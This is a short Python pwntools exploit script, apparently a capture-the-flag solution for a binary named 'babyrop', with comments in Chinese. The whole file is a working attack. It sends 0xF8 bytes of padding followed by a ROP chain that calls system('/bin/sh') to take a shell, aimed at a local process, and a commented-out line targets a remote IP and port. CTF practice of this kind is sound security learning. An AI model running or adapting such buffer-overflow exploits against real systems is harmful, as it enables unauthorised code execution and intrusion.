#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from pwn import *

# 输出详细信息
# context(log_level='debug')

# 将当前架构设为 amd64，否则可能会生成错误的 ROP 链。
context(arch='amd64')

# 本地测试
p = process("./babyrop")
# p = remote("34.80.207.78", 10001)

sh_str = 0x400836 # "/bin/sh"
system = 0x400724 # call system

rop = ROP(ELF("./babyrop"))
rop.call(system, [sh_str]) 

p.sendlineafter("Enter your comment:", 'A' * 0xF8 + rop.chain())

p.interactive()
